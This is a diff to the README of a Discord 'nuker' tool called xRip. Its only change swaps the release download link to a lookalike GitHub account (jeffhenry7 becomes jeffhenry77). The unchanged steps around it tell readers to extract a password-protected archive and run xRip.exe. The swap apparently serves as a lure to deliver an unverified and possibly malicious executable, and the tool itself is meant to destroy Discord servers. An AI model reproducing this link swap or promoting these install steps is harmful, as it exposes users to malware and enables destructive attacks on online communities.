@@ -3,7 +3,7 @@ xrip, fastest nuker on discord written in py.
 ## Installation
 For compiled version:
 
-- Download latest version from [releases](https://github.com/jeffhenry7/xRip-Nuker/releases/tag/v7.0)
+- Download latest version from [releases](https://github.com/jeffhenry77/xRip-Nuker/releases/tag/v7.0)
 - Set the password : 1
 - Extract all the content 
 - Run xRip.exe
